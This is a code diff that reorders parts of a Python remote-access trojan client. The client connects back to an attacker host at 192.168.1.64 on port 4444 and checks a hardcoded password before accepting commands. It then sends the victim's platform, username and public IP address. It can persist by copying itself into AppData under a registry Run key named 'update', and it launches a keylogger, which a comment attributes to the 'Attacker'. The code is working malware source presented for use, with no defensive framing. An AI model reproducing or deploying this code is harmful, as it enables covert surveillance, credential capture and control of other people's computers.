@@ -67,54 +67,6 @@ imports()
 
 time.sleep(.1)
 
-engine = pyttsx3.init()
-voices = engine.getProperty('voices')
-engine.setProperty('rate', 200)
-engine.setProperty('voice', voices[1].id)
-engine.runAndWait()
-
-
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-while True:
-    time.sleep(3)
-    try:
-        connection.connect(("192.168.1.64", 4444))
-        break
-    except Exception as e:
-        print(e)
-
-
-oss = sys.platform
-passwd = "Testing95"
-logsuc = "[+] Login Successful"
-logfail = "Incorrect"
-something = "something"
-cd_check = 0
-invalid_dir = "Invalid Directory"
-has_ben_defed = 0
-logger_enabled = False
-###############################
-
-
-def login():
-    while True:
-        lr = str(connection.recv(1024), "utf-8")
-        if lr == passwd:
-            connection.send(str.encode(logsuc))
-            connection.send(str.encode(json.dumps(
-                [oss, getpass.getuser(), requests.get('https://api.ipify.org/').text])))
-            break
-        elif lr != passwd:
-            connection.send(str.encode(logfail))
-
-
-def start_up():
-    file_location = os.environ["appdata" + "\\WINDOWS'.exe"]
-    if not os.path.exists(file_location):
-        shutil.copyfile(sys.executable, file_location)
-        subprocess.call(
-            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)
-
 
 def start_keylogger():
     global window_log
@@ -338,6 +290,62 @@ def start_keylogger():
     establish_dir()
     keylogger()
 
+if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
+    logger_enabled = True
+    # Attacker has enabled keylogger on this machine before
+    threading.Thread(target=start_keylogger).start()
+
+engine = pyttsx3.init()
+voices = engine.getProperty('voices')
+engine.setProperty('rate', 200)
+engine.setProperty('voice', voices[1].id)
+engine.runAndWait()
+
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+while True:
+    time.sleep(3)
+    try:
+        connection.connect(("192.168.1.64", 4444))
+        break
+    except Exception as e:
+        print(e)
+
+
+oss = sys.platform
+passwd = "Testing95"
+logsuc = "[+] Login Successful"
+logfail = "Incorrect"
+something = "something"
+cd_check = 0
+invalid_dir = "Invalid Directory"
+has_ben_defed = 0
+logger_enabled = False
+###############################
+
+
+def login():
+    while True:
+        lr = str(connection.recv(1024), "utf-8")
+        if lr == passwd:
+            connection.send(str.encode(logsuc))
+            connection.send(str.encode(json.dumps(
+                [oss, getpass.getuser(), requests.get('https://api.ipify.org/').text])))
+            break
+        elif lr != passwd:
+            connection.send(str.encode(logfail))
+
+
+def start_up():
+    file_location = os.environ["appdata" + "\\WINDOWS'.exe"]
+    if not os.path.exists(file_location):
+        shutil.copyfile(sys.executable, file_location)
+        subprocess.call(
+            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)
+
+
+
+
 
 def run_commands():
     global has_ben_defed
@@ -479,12 +487,10 @@ def run_commands():
         run_commands()
 
 
-if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
-    logger_enabled = True
-    # Attacker has enabled keylogger on this machine before
-    threading.Thread(target=start_keylogger).start()
-
 # start_up()
 # If you uncomment the line above, the file will be added to the startup directory to that the client will start up everytime the computer turns on
 login()
 run_commands()
+
+
+
